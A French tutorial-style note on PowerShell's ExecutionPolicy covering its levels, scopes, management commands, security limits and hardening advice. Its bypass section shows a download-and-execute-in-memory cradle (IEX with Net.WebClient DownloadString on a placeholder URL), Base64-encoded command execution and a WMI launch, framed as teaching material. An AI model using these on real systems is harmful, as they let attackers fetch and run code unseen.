

## 📑 Table des matières

```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 2 # Include headings from the specified level
maxLevel: 2 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```

---

## 🎯 Introduction

L'**ExecutionPolicy** est un mécanisme de sécurité intégré à PowerShell qui contrôle l'exécution des scripts. Il ne s'agit pas d'un système de permissions à proprement parler, mais plutôt d'une **couche de protection contre l'exécution accidentelle de scripts non approuvés**.

> [!warning] Point crucial L'ExecutionPolicy n'est **PAS** une fonctionnalité de sécurité robuste. Elle peut être contournée facilement et ne protège pas contre des attaquants déterminés. Son objectif principal est d'éviter les erreurs de manipulation.

---

## 🧩 Concept de politique d'exécution

### Qu'est-ce qu'une ExecutionPolicy ?

L'ExecutionPolicy définit les **conditions dans lesquelles PowerShell charge et exécute des fichiers de configuration et des scripts**. Elle agit comme un garde-fou pour :

- Empêcher l'exécution accidentelle de scripts malveillants
- Forcer la vérification de signatures numériques
- Contrôler l'origine des scripts (local vs distant)

### Comment fonctionne-t-elle ?

PowerShell évalue l'ExecutionPolicy en suivant un **ordre de priorité** :

1. **GPO (Group Policy Object)** - Si configurée via politique de groupe (priorité maximale)
2. **Portée Process** - Pour la session en cours uniquement
3. **Portée CurrentUser** - Pour l'utilisateur actuel
4. **Portée LocalMachine** - Pour tous les utilisateurs de la machine
5. **Par défaut** - Restricted sur Windows client, RemoteSigned sur Windows Server

> [!info] À savoir La première politique trouvée dans cet ordre est celle qui s'applique. Les politiques définies par GPO **ne peuvent pas être contournées** sans droits administratifs sur le domaine.

---

## 📊 Les niveaux de politique

PowerShell propose **5 niveaux de politique** d'exécution, du plus restrictif au plus permissif :

### 1. **Restricted** 🔴

```powershell
Set-ExecutionPolicy Restricted
```

**Caractéristiques :**

- **Aucun script ne peut être exécuté** (même locaux)
- Seules les commandes interactives sont autorisées
- Niveau par défaut sur Windows client (Desktop)

**Quand l'utiliser :**

- Environnements hautement sécurisés
- Machines où aucun script ne devrait jamais s'exécuter

> [!example] Comportement
> 
> ```powershell
> PS> .\monscript.ps1
> # Erreur : L'exécution de scripts est désactivée sur ce système.
> ```

### 2. **AllSigned** 🟡

```powershell
Set-ExecutionPolicy AllSigned
```

**Caractéristiques :**

- **Tous les scripts** (locaux et distants) **doivent être signés numériquement**
- La signature doit provenir d'un éditeur de confiance
- PowerShell demande confirmation pour chaque nouvel éditeur

**Quand l'utiliser :**

- Environnements d'entreprise avec PKI (Public Key Infrastructure)
- Lorsqu'un contrôle strict de l'origine des scripts est requis

> [!example] Comportement
> 
> ```powershell
> PS> .\script-signe.ps1
> # Vérifie la signature numérique
> # Si non signé : Erreur
> # Si signé par éditeur inconnu : Demande de confirmation
> ```

### 3. **RemoteSigned** 🟢 (Recommandé)

```powershell
Set-ExecutionPolicy RemoteSigned
```

**Caractéristiques :**

- Scripts **locaux** : peuvent s'exécuter **sans signature**
- Scripts **téléchargés** depuis Internet : **doivent être signés**
- Niveau par défaut sur Windows Server

**Quand l'utiliser :**

- Configuration standard pour la plupart des environnements
- Équilibre entre sécurité et praticité

> [!info] Définition de "distant" Un script est considéré comme "distant" s'il possède la marque NTFS "Zone.Identifier" (téléchargé depuis Internet, reçu par email, etc.).

> [!example] Comportement
> 
> ```powershell
> # Script local - OK
> PS> C:\Scripts\monscript.ps1
> 
> # Script téléchargé - Erreur si non signé
> PS> C:\Downloads\script-web.ps1
> # Erreur : Le fichier n'est pas signé numériquement
> ```

### 4. **Unrestricted** 🟠

```powershell
Set-ExecutionPolicy Unrestricted
```

**Caractéristiques :**

- **Tous les scripts peuvent s'exécuter**
- Scripts distants non signés : **avertissement** mais exécution autorisée après confirmation
- Pas de vérification de signature

**Quand l'utiliser :**

- Environnements de développement
- Situations nécessitant une flexibilité maximale

> [!warning] Attention Ce niveau offre très peu de protection. À utiliser avec précaution.

> [!example] Comportement
> 
> ```powershell
> PS> .\script-telecharge.ps1
> # Avertissement de sécurité (confirmation demandée)
> # Mais le script peut s'exécuter
> ```

### 5. **Bypass** ⚪

```powershell
Set-ExecutionPolicy Bypass
```

**Caractéristiques :**

- **Aucune restriction, aucun avertissement**
- Tous les scripts s'exécutent sans vérification ni confirmation
- Aucune marque NTFS n'est vérifiée

**Quand l'utiliser :**

- Scripts automatisés dans des environnements contrôlés
- Lancement de PowerShell depuis une application qui gère elle-même la sécurité
- **Temporairement** pour résoudre des blocages spécifiques

> [!warning] Danger Ce niveau désactive complètement toute protection. À réserver aux cas très spécifiques et contrôlés.

### 📋 Tableau récapitulatif

|Niveau|Scripts locaux|Scripts distants|Avertissements|Usage recommandé|
|---|---|---|---|---|
|**Restricted**|❌ Non|❌ Non|-|Aucun script|
|**AllSigned**|✅ Si signés|✅ Si signés|Nouvel éditeur|Entreprise avec PKI|
|**RemoteSigned**|✅ Oui|✅ Si signés|-|**Standard recommandé**|
|**Unrestricted**|✅ Oui|⚠️ Avec confirmation|Oui|Développement|
|**Bypass**|✅ Oui|✅ Oui|❌ Non|Scripts automatisés|

---

## 🎯 Les portées des politiques

L'ExecutionPolicy peut être définie à **trois niveaux de portée** différents, chacun ayant une priorité et un impact différent.

### 1. **MachinePolicy** (GPO Machine)

**Caractéristiques :**

- Définie par **Group Policy Object** au niveau machine
- **Priorité absolue** (ne peut pas être écrasée)
- Nécessite des droits administratifs domaine pour modification

```powershell
# Vérifier si une politique GPO est active
Get-ExecutionPolicy -List
```

> [!info] À savoir Cette portée n'apparaît que si une GPO de domaine définit l'ExecutionPolicy. Elle prend le dessus sur toutes les autres.

### 2. **UserPolicy** (GPO Utilisateur)

**Caractéristiques :**

- Définie par **Group Policy Object** au niveau utilisateur
- Priorité élevée (juste après MachinePolicy)
- Nécessite des droits administratifs domaine pour modification

### 3. **Process**

**Caractéristiques :**

- S'applique **uniquement à la session PowerShell en cours**
- **Temporaire** : disparaît à la fermeture de PowerShell
- Priorité après les GPO
- Utile pour des besoins ponctuels

```powershell
# Définir pour la session en cours uniquement
Set-ExecutionPolicy Bypass -Scope Process

# Ou au lancement de PowerShell
powershell.exe -ExecutionPolicy Bypass
```

> [!tip] Astuce C'est la méthode la plus sûre pour contourner temporairement les restrictions sans impact permanent.

### 4. **CurrentUser**

**Caractéristiques :**

- S'applique à **l'utilisateur actuellement connecté**
- Stockée dans le registre de l'utilisateur (`HKCU`)
- **Ne nécessite PAS de droits administrateur**
- Priorité après Process

```powershell
# Modification sans droits admin
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

> [!info] Localisation `HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell`

### 5. **LocalMachine**

**Caractéristiques :**

- S'applique à **tous les utilisateurs de la machine**
- Stockée dans le registre système (`HKLM`)
- **Nécessite des droits administrateur** pour modification
- Priorité la plus basse (mais s'applique par défaut si rien d'autre n'est défini)

```powershell
# Nécessite PowerShell en mode administrateur
Set-ExecutionPolicy RemoteSigned -Scope LocalMachine
```

> [!info] Localisation `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell`

### 📊 Ordre de priorité

```
1. MachinePolicy (GPO Machine)    ← Priorité maximale
2. UserPolicy (GPO Utilisateur)
3. Process (Session en cours)
4. CurrentUser (Utilisateur)
5. LocalMachine (Machine)         ← Priorité minimale
```

> [!warning] Important PowerShell applique la **première politique trouvée** dans cet ordre. Les politiques GPO ne peuvent pas être contournées par les commandes PowerShell standard.

### 🔍 Visualiser toutes les portées

```powershell
# Afficher toutes les politiques par portée
Get-ExecutionPolicy -List
```

**Exemple de sortie :**

```
Scope          ExecutionPolicy
-----          ---------------
MachinePolicy  Undefined
UserPolicy     Undefined
Process        Undefined
CurrentUser    RemoteSigned
LocalMachine   Restricted
```

---

## ⚙️ Commandes de gestion

### `Get-ExecutionPolicy`

**Permet de consulter** la politique d'exécution active.

#### Syntaxe de base

```powershell
# Afficher la politique effective (celle qui s'applique)
Get-ExecutionPolicy

# Afficher toutes les portées
Get-ExecutionPolicy -List

# Afficher une portée spécifique
Get-ExecutionPolicy -Scope CurrentUser
```

#### Paramètres principaux

|Paramètre|Description|Exemple|
|---|---|---|
|`-List`|Affiche toutes les portées|`Get-ExecutionPolicy -List`|
|`-Scope`|Spécifie une portée|`Get-ExecutionPolicy -Scope Process`|

> [!example] Exemples pratiques
> 
> ```powershell
> # Quelle est ma politique actuelle ?
> PS> Get-ExecutionPolicy
> RemoteSigned
> 
> # Voir toutes les configurations
> PS> Get-ExecutionPolicy -List
> Scope          ExecutionPolicy
> -----          ---------------
> MachinePolicy  Undefined
> UserPolicy     Undefined
> Process        Undefined
> CurrentUser    RemoteSigned
> LocalMachine   Restricted
> 
> # Vérifier si une GPO est active
> PS> Get-ExecutionPolicy -Scope MachinePolicy
> Undefined  # Pas de GPO définie
> ```

---

### `Set-ExecutionPolicy`

**Permet de modifier** la politique d'exécution.

#### Syntaxe de base

```powershell
Set-ExecutionPolicy [-ExecutionPolicy] <Niveau> 
                    [-Scope <Portée>] 
                    [-Force]
```

#### Paramètres principaux

|Paramètre|Description|Valeurs possibles|
|---|---|---|
|`-ExecutionPolicy`|Niveau de politique|Restricted, AllSigned, RemoteSigned, Unrestricted, Bypass, Undefined|
|`-Scope`|Portée d'application|Process, CurrentUser, LocalMachine|
|`-Force`|Supprime les confirmations|-|

#### Valeur spéciale : `Undefined`

```powershell
# Supprimer une politique (la remettre à Undefined)
Set-ExecutionPolicy Undefined -Scope CurrentUser
```

> [!info] Comportement de Undefined Quand une portée est à `Undefined`, PowerShell passe à la portée suivante dans l'ordre de priorité.

#### Exemples pratiques

```powershell
# Modifier pour l'utilisateur actuel (sans droits admin)
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

# Modifier pour toute la machine (nécessite admin)
Set-ExecutionPolicy RemoteSigned -Scope LocalMachine

# Modifier pour la session en cours uniquement
Set-ExecutionPolicy Bypass -Scope Process

# Modifier sans confirmation
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

# Remettre à la valeur par défaut
Set-ExecutionPolicy Undefined -Scope CurrentUser
```

> [!warning] Droits requis
> 
> - **CurrentUser** et **Process** : Aucun droit admin requis
> - **LocalMachine** : Nécessite PowerShell en mode administrateur
> - **GPO** : Nécessite des droits sur Active Directory

#### Confirmation interactive

Par défaut, `Set-ExecutionPolicy` demande confirmation :

```powershell
PS> Set-ExecutionPolicy RemoteSigned

Changement de la stratégie d'exécution
La stratégie d'exécution permet de vous protéger contre les scripts non fiables.
Voulez-vous vraiment modifier cette stratégie ?
[O] Oui  [T] Oui à tout  [N] Non  [?] Aide (la valeur par défaut est "N") :
```

**Options :**

- `O` : Oui pour cette modification
- `T` : Oui à tout (toutes les confirmations de cette commande)
- `N` : Non (annule la modification)
- `-Force` : Évite complètement la confirmation

---

### 🔍 Commandes complémentaires

#### Vérifier si un script peut s'exécuter

```powershell
# Tester si un fichier serait bloqué
Get-Item .\script.ps1 | Get-AuthenticodeSignature

# Vérifier la marque Zone.Identifier (script téléchargé)
Get-Item .\script.ps1 -Stream Zone.Identifier
```

#### Débloquer un script téléchargé

```powershell
# Retirer la marque "Zone.Identifier" d'un fichier
Unblock-File -Path .\script.ps1

# Débloquer tous les scripts d'un dossier
Get-ChildItem *.ps1 | Unblock-File
```

> [!tip] Astuce `Unblock-File` est souvent plus sûr que de modifier l'ExecutionPolicy. Elle supprime la marque indiquant qu'un fichier provient d'Internet.

---

## 🛡️ Implications de sécurité

### Ce que l'ExecutionPolicy protège

> [!info] Protection principale L'ExecutionPolicy vise à **empêcher l'exécution accidentelle de scripts non approuvés**, notamment :
> 
> - Scripts téléchargés par erreur
> - Pièces jointes d'emails malveillantes
> - Scripts copiés depuis des sources non fiables

### Ce que l'ExecutionPolicy NE protège PAS

> [!warning] Limitations importantes L'ExecutionPolicy **n'est PAS** un mécanisme de sécurité robuste car :

#### 1. **Facilement contournable**

```powershell
# Nombreuses méthodes de contournement
powershell -ExecutionPolicy Bypass -File script.ps1
Get-Content .\script.ps1 | powershell -NoProfile -
powershell -Command "IEX (Get-Content .\script.ps1)"
```

#### 2. **Ne protège pas contre les utilisateurs déterminés**

Un attaquant avec accès à une session PowerShell peut :

- Modifier la politique à portée Process
- Copier-coller le contenu du script directement
- Utiliser des alias et encodages

#### 3. **Ne s'applique qu'aux fichiers scripts**

```powershell
# Ces commandes s'exécutent toujours, peu importe l'ExecutionPolicy
Invoke-Expression "Write-Host 'Code malveillant'"
Invoke-Command -ScriptBlock { Remove-Item -Recurse }
```

> [!warning] Point crucial L'ExecutionPolicy bloque l'exécution de **fichiers .ps1**, mais **pas le code PowerShell interactif** ou exécuté via `Invoke-Expression`.

### 🎯 Menaces réelles et protections appropriées

|Menace|ExecutionPolicy utile ?|Protection appropriée|
|---|---|---|
|Utilisateur non technique clique sur script malveillant|✅ Oui|ExecutionPolicy + Formation|
|Malware télécharge et exécute un script|❌ Non|Antivirus + EDR + AppLocker|
|Administrateur malveillant|❌ Non|Séparation des privilèges + Audit|
|Script automatisé non signé|✅ Oui|AllSigned + PKI d'entreprise|

### 🔐 Protection renforcée : AppLocker et WDAC

Pour une vraie sécurité, utilisez des mécanismes complémentaires :

#### **AppLocker** (Windows Pro/Enterprise)

```powershell
# Bloquer PowerShell pour certains utilisateurs
# Via Group Policy : Computer Configuration > Windows Settings > Security Settings > Application Control Policies
```

**Avantages :**

- Contrôle basé sur le hash, l'éditeur ou le chemin
- Peut bloquer complètement PowerShell pour certains utilisateurs
- **Ne peut pas être contourné** par l'utilisateur

#### **WDAC** (Windows Defender Application Control)

- Successeur d'AppLocker sur Windows 10+
- Contrôle au niveau du noyau (kernel)
- Protection contre les attaques sophistiquées

> [!tip] Recommandation En environnement d'entreprise sensible :
> 
> 1. **ExecutionPolicy** = RemoteSigned ou AllSigned (première ligne de défense)
> 2. **AppLocker/WDAC** = Contrôle applicatif strict (vraie sécurité)
> 3. **Antivirus/EDR** = Détection comportementale
> 4. **Audit** = Journalisation des exécutions PowerShell

### 📊 Niveaux de sécurité réels

```
┌─────────────────────────────────────────────┐
│ Protection faible                           │
│ ExecutionPolicy: Unrestricted/Bypass        │
│ → Bloque uniquement l'erreur de l'utilisateur│
└─────────────────────────────────────────────┘
                    ⬇️
┌─────────────────────────────────────────────┐
│ Protection moyenne                          │
│ ExecutionPolicy: RemoteSigned               │
│ → + Vérification de l'origine               │
└─────────────────────────────────────────────┘
                    ⬇️
┌─────────────────────────────────────────────┐
│ Protection élevée                           │
│ ExecutionPolicy: AllSigned                  │
│ + PKI d'entreprise                          │
│ → + Vérification de l'intégrité             │
└─────────────────────────────────────────────┘
                    ⬇️
┌─────────────────────────────────────────────┐
│ Protection maximale                         │
│ AppLocker/WDAC + Antivirus + EDR            │
│ → Protection non contournable               │
└─────────────────────────────────────────────┘
```

### 🎓 Conclusion sur la sécurité

> [!info] À retenir
> 
> - L'ExecutionPolicy est un **garde-fou**, pas un mur
> - Elle protège contre les **erreurs**, pas contre les **attaques**
> - Pour une vraie sécurité : **défense en profondeur** (plusieurs couches)
> - Toujours combiner avec d'autres mécanismes de sécurité

---

## 🔓 Contournement et bonnes pratiques

### Méthodes de contournement (à connaître pour comprendre les limites)

> [!warning] Avertissement éthique Ces techniques sont présentées à des fins pédagogiques pour comprendre les limitations de l'ExecutionPolicy. Ne les utilisez jamais de manière malveillante.

#### 1. **Modification temporaire de la portée Process**

```powershell
# Lance PowerShell avec Bypass pour cette session uniquement
powershell.exe -ExecutionPolicy Bypass

# Exécute un script avec Bypass
powershell.exe -ExecutionPolicy Bypass -File .\script.ps1

# Alternative avec NoProfile pour éviter les configurations
powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\script.ps1
```

> [!info] Pourquoi cela fonctionne La portée `Process` a la priorité sur `CurrentUser` et `LocalMachine`. Seules les GPO peuvent bloquer ceci.

#### 2. **Lecture et injection du script**

```powershell
# Lire le contenu et l'exécuter directement
Get-Content .\script.ps1 | Invoke-Expression

# Variante abrégée
gc .\script.ps1 | iex

# Via pipeline
Get-Content .\script.ps1 | powershell -NoProfile -
```

#### 3. **Téléchargement et exécution en mémoire**

```powershell
# Télécharger et exécuter sans toucher le disque
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://exemple.com/script.ps1')

# Variante courte
IEX (New-Object Net.WebClient).DownloadString('URL')

# Via Invoke-WebRequest (PowerShell 3.0+)
IEX (Invoke-WebRequest 'URL').Content
```

> [!warning] Très dangereux Cette méthode est couramment utilisée par les malwares car le script n'est jamais écrit sur le disque.

#### 4. **Encodage en Base64**

```powershell
# Encoder un script
$script = Get-Content .\script.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encodedScript = [Convert]::ToBase64String($bytes)

# Exécuter le script encodé
powershell.exe -EncodedCommand $encodedScript
```

#### 5. **Suppression de la marque Zone.Identifier**

```powershell
# Débloquer un fichier téléchargé
Unblock-File -Path .\script.ps1

# Débloquer récursivement
Get-ChildItem -Recurse | Unblock-File
```

> [!tip] Méthode légitime C'est la méthode **recommandée** pour débloquer des scripts de sources fiables.

#### 6. **Copier-coller direct**

```powershell
# L'ExecutionPolicy ne s'applique pas au code tapé/collé
# L'utilisateur peut simplement copier le contenu du script
# et le coller dans la console PowerShell
```

#### 7. **Utilisation de commandes alternatives**

```powershell
# Utiliser des commandes au lieu de scripts
cmd.exe /c "powershell -Command Get-Process"

# Via WMI
$command = "Get-Process"
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command $command"
```

---

### ✅ Bonnes pratiques

#### Pour les administrateurs système

> [!tip] Configuration recommandée standard
> 
> ```powershell
> # Pour la plupart des environnements
> Set-ExecutionPolicy RemoteSigned -Scope LocalMachine
> 
> # Pour les utilisateurs qui développent
> Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
> ```

**Principes :**

1. **Utiliser RemoteSigned comme base**
    
    - Équilibre entre sécurité et productivité
    - Protège contre les scripts téléchargés non signés
    - Permet l'exécution de scripts locaux
2. **Déployer via GPO en environnement d'entreprise**
    
    ```
    Computer Configuration > Policies > Administrative Templates 
    > Windows Components > Windows PowerShell > Turn on Script Execution
    ```
    
    - Empêche les utilisateurs de contourner
    - Configuration centralisée et uniforme
3. **Implémenter AllSigned si PKI disponible**
    
    ```powershell
    Set-ExecutionPolicy AllSigned -Scope LocalMachine
    ```
    
    - Nécessite une infrastructure de certificats
    - Garantit l'authenticité et l'intégrité des scripts
    - Idéal pour environnements hautement sécurisés
4. **Activer la journalisation PowerShell**
    
    ```powershell
    # Via GPO : Activer Module Logging et Script Block Logging
    # Computer Configuration > Administrative Templates > Windows Components 
    # > Windows PowerShell > Turn on Module Logging
    # > Turn on PowerShell Script Block Logging
    ```
    
    - Permet l'audit des exécutions
    - Détecte les tentatives de contournement
5. **Combiner avec AppLocker/WDAC**
    
    - Bloquer PowerShell pour les utilisateurs non autorisés
    - Restreindre l'exécution à des chemins spécifiques

#### Pour les développeurs

> [!tip] Workflow de développement
> 
> ```powershell
> # En développement local
> Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
> 
> # Pour une session de test ponctuelle
> powershell.exe -ExecutionPolicy Bypass
> 
> # Débloquer les scripts téléchargés de confiance
> Unblock-File -Path .\script-telecharge.ps1
> ```

**Principes :**

1. **Ne jamais utiliser Bypass/Unrestricted en LocalMachine**
    
    - Réserver à la portée Process pour des tests
    - Éviter les modifications permanentes laxistes
2. **Signer vos scripts de production**
    
    ```powershell
    # Obtenir un certificat de signature de code
    $cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert
    
    # Signer un script
    Set-AuthenticodeSignature -FilePath .\script.ps1 -Certificate $cert
    ```
    
3. **Documenter les dépendances d'ExecutionPolicy**
    
    ```powershell
    <#
    .NOTES
    Nécessite ExecutionPolicy: RemoteSigned ou supérieur
    #>
    ```
    
4. **Tester avec plusieurs niveaux de politique**
    
    ```powershell
    # Tester que votre script fonctionne avec RemoteSigned
    powershell.exe -ExecutionPolicy RemoteSigned -File .\script.ps1
    ```
    

#### Pour les utilisateurs finaux

> [!tip] Utilisation sécurisée
> 
> 1. **Ne pas modifier l'ExecutionPolicy sans comprendre les implications**
> 2. **Utiliser Unblock-File pour les scripts de confiance**
>     
>     ```powershell
>     Unblock-File -Path .\script.ps1
>     ```
>     
> 3. **Vérifier l'origine des scripts avant de les débloquer**
> 4. **Privilégier les scripts signés de sources officielles**

#### Checklist de sécurité

```
✅ ExecutionPolicy configurée (minimum RemoteSigned)
✅ GPO déployée en environnement d'entreprise
✅ Scripts de production signés numériquement
✅ Journalisation PowerShell activée
✅ AppLocker/WDAC déployé sur postes sensibles
✅ Formation des utilisateurs aux risques
✅ Procédure de validation des scripts externes
✅ Audit régulier des politiques et des logs
```

---

### 🎯 Stratégies par environnement

#### 🏢 Environnement d'entreprise standard

```powershell
# GPO Machine
Set-ExecutionPolicy RemoteSigned -Scope LocalMachine

# + AppLocker pour les utilisateurs standards
# + Journalisation activée
# + Antivirus/EDR
```

#### 🔒 Environnement hautement sécurisé

```powershell
# GPO Machine
Set-ExecutionPolicy AllSigned -Scope LocalMachine

# + PKI interne pour signature des scripts
# + WDAC pour contrôle applicatif
# + Journalisation complète
# + Analyse comportementale
```

#### 💻 Poste de développeur

```powershell
# CurrentUser
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

# + Unblock-File pour scripts de confiance
# + Environnements de test isolés (VM/containers)
```

#### 🖥️ Serveur de production

```powershell
# GPO Machine
Set-ExecutionPolicy AllSigned -Scope LocalMachine

# + Tous les scripts signés et validés
# + Journalisation complète
# + Exécution via comptes de service dédiés
# + Aucun accès PowerShell pour utilisateurs standards
```

#### 🧪 Environnement de test

```powershell
# CurrentUser ou LocalMachine
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

# + Isolation réseau
# + Snapshots réguliers
# + Tests de régression avant production
```

---

### 🚨 Pièges courants à éviter

#### ❌ Piège 1 : Utiliser Unrestricted ou Bypass par défaut

```powershell
# MAUVAISE PRATIQUE
Set-ExecutionPolicy Unrestricted -Scope LocalMachine

# BONNE PRATIQUE
Set-ExecutionPolicy RemoteSigned -Scope LocalMachine
# Et utiliser Unblock-File pour les scripts de confiance
```

> [!warning] Pourquoi c'est problématique Désactive complètement la protection contre les scripts téléchargés. Un simple clic sur une pièce jointe malveillante peut compromettre le système.

---

#### ❌ Piège 2 : Oublier la portée

```powershell
# ATTENTION : Modifie LocalMachine (nécessite admin)
Set-ExecutionPolicy RemoteSigned

# PRÉFÉRABLE : Spécifier explicitement la portée
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

> [!tip] Bonne pratique Toujours spécifier explicitement `-Scope` pour éviter les surprises et documenter l'intention.

---

#### ❌ Piège 3 : Ne pas vérifier les GPO

```powershell
# Vérifier AVANT de modifier
Get-ExecutionPolicy -List

# Si MachinePolicy ou UserPolicy est définie, vos modifications n'auront aucun effet
```

> [!warning] À retenir Les GPO ont toujours la priorité. Si vous ne pouvez pas modifier l'ExecutionPolicy, vérifiez d'abord les politiques de groupe.

---

#### ❌ Piège 4 : Confondre sécurité et ExecutionPolicy

```powershell
# FAUSSE SÉCURITÉ
Set-ExecutionPolicy Restricted
# → Un attaquant peut facilement contourner

# VRAIE SÉCURITÉ
# → AppLocker + Antivirus + EDR + Formation + Audit
```

> [!info] Rappel important L'ExecutionPolicy n'est **PAS** une fonctionnalité de sécurité robuste. Elle complète d'autres mécanismes, mais ne les remplace pas.

---

#### ❌ Piège 5 : Bloquer ses propres scripts

```powershell
# Script téléchargé depuis Internet
PS> .\mon-script.ps1
# Erreur : Impossible d'exécuter car le fichier n'est pas signé

# SOLUTION 1 : Débloquer le fichier
Unblock-File -Path .\mon-script.ps1

# SOLUTION 2 : Exécution ponctuelle
powershell.exe -ExecutionPolicy Bypass -File .\mon-script.ps1

# SOLUTION 3 : Supprimer manuellement la marque
Remove-Item -Path .\mon-script.ps1 -Stream Zone.Identifier
```

---

#### ❌ Piège 6 : Ne pas documenter les modifications

```powershell
# MAUVAISE PRATIQUE
Set-ExecutionPolicy Bypass -Scope Process
# Exécute des scripts sans traçabilité

# BONNE PRATIQUE
Write-Host "Modification temporaire de l'ExecutionPolicy pour tests"
Set-ExecutionPolicy Bypass -Scope Process
# Exécuter les tests
Write-Host "Tests terminés - la politique reviendra à la normale à la fermeture"
```

---

### 📝 Scénarios pratiques et résolutions

#### Scénario 1 : "Je ne peux pas exécuter mon script"

**Symptôme :**

```powershell
PS> .\mon-script.ps1
.\mon-script.ps1 : Impossible de charger le fichier car l'exécution de scripts est désactivée
```

**Diagnostic :**

```powershell
# 1. Vérifier la politique actuelle
Get-ExecutionPolicy

# 2. Vérifier toutes les portées
Get-ExecutionPolicy -List

# 3. Vérifier si le fichier est bloqué
Get-Item .\mon-script.ps1 -Stream Zone.Identifier
```

**Solutions par ordre de préférence :**

```powershell
# SOLUTION 1 (RECOMMANDÉE) : Débloquer le fichier si c'est un script de confiance
Unblock-File -Path .\mon-script.ps1

# SOLUTION 2 : Modifier pour l'utilisateur (si pas de GPO)
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

# SOLUTION 3 : Exécution ponctuelle
powershell.exe -ExecutionPolicy Bypass -File .\mon-script.ps1

# SOLUTION 4 : Session temporaire
Set-ExecutionPolicy Bypass -Scope Process
.\mon-script.ps1
```

---

#### Scénario 2 : "Set-ExecutionPolicy ne fonctionne pas"

**Symptôme :**

```powershell
PS> Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
PS> Get-ExecutionPolicy
Restricted  # Toujours Restricted !
```

**Cause probable : GPO active**

**Diagnostic :**

```powershell
# Vérifier les GPO
Get-ExecutionPolicy -List

# Résultat probable :
# MachinePolicy    Restricted  ← GPO active !
# CurrentUser      RemoteSigned
```

**Solutions :**

```powershell
# SOLUTION 1 : Utiliser la portée Process (si autorisé)
Set-ExecutionPolicy Bypass -Scope Process

# SOLUTION 2 : Contacter l'administrateur système
# pour modifier la GPO

# SOLUTION 3 (SI ADMIN) : Lancer avec bypass
powershell.exe -ExecutionPolicy Bypass
```

---

#### Scénario 3 : "Déployer des scripts signés en entreprise"

**Objectif : Infrastructure de scripts signés**

**Étape 1 : Obtenir un certificat de signature de code**

```powershell
# Via PKI interne d'entreprise
# Ou acheter un certificat public (Digicert, Sectigo, etc.)

# Vérifier les certificats disponibles
Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert
```

**Étape 2 : Signer les scripts**

```powershell
# Récupérer le certificat
$cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert | Select-Object -First 1

# Signer un script
Set-AuthenticodeSignature -FilePath .\script.ps1 -Certificate $cert

# Signer tous les scripts d'un dossier
Get-ChildItem *.ps1 -Recurse | ForEach-Object {
    Set-AuthenticodeSignature -FilePath $_.FullName -Certificate $cert
}
```

**Étape 3 : Configurer l'ExecutionPolicy**

```powershell
# Via GPO : AllSigned
Set-ExecutionPolicy AllSigned -Scope LocalMachine

# Les utilisateurs devront accepter le certificat une fois
```

**Étape 4 : Distribuer le certificat racine**

```powershell
# Ajouter le certificat aux autorités de confiance
# Via GPO : Computer Configuration > Windows Settings > Security Settings
# > Public Key Policies > Trusted Publishers
```

---

#### Scénario 4 : "Script téléchargé pour développement"

**Situation : Téléchargement d'un module PowerShell depuis GitHub**

```powershell
# Le module est bloqué car téléchargé
Import-Module .\MonModule.psm1
# Erreur : Le fichier n'est pas signé numériquement

# SOLUTION SÉCURISÉE
# 1. Vérifier la source (hash SHA256, réputation GitHub)
Get-FileHash .\MonModule.psm1 -Algorithm SHA256

# 2. Débloquer après vérification
Unblock-File -Path .\MonModule.psm1
Get-ChildItem .\MonModule -Recurse | Unblock-File

# 3. Importer normalement
Import-Module .\MonModule.psm1
```

---

### 🔍 Dépannage avancé

#### Vérifier la signature d'un script

```powershell
# Obtenir les détails de signature
Get-AuthenticodeSignature -FilePath .\script.ps1

# Propriétés importantes :
# Status       : Valid, NotSigned, HashMismatch, UnknownError
# SignerCertificate : Certificat utilisé
# TimeStamperCertificate : Horodatage
```

**Statuts possibles :**

|Statut|Signification|Action|
|---|---|---|
|`Valid`|Signature valide et certificat de confiance|✅ Peut s'exécuter avec AllSigned|
|`NotSigned`|Aucune signature|❌ Bloqué avec AllSigned/RemoteSigned|
|`HashMismatch`|Fichier modifié après signature|❌ Ne jamais exécuter !|
|`UnknownError`|Problème de vérification|⚠️ Investiguer|

---

#### Vérifier si un fichier provient d'Internet

```powershell
# Lire la marque Zone.Identifier
Get-Content .\script.ps1 -Stream Zone.Identifier

# Résultat typique :
# [ZoneTransfer]
# ZoneId=3  ← 3 = Internet

# Zones courantes :
# 0 = Local machine
# 1 = Local intranet
# 2 = Trusted sites
# 3 = Internet
# 4 = Restricted sites
```

---

#### Journalisation et audit

```powershell
# Activer la journalisation des scripts (via GPO recommandé)
# Computer Configuration > Administrative Templates > Windows Components
# > Windows PowerShell > Turn on PowerShell Script Block Logging

# Consulter les logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | 
    Where-Object {$_.Id -eq 4104} |  # Script Block Logging
    Select-Object TimeCreated, Message |
    Format-List

# Rechercher les tentatives de contournement
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object {$_.Message -like "*ExecutionPolicy*Bypass*"}
```

---

### 💡 Astuces de productivité

#### Créer un profil pour ajuster automatiquement

```powershell
# Éditer votre profil PowerShell
notepad $PROFILE

# Ajouter cette ligne pour définir automatiquement CurrentUser
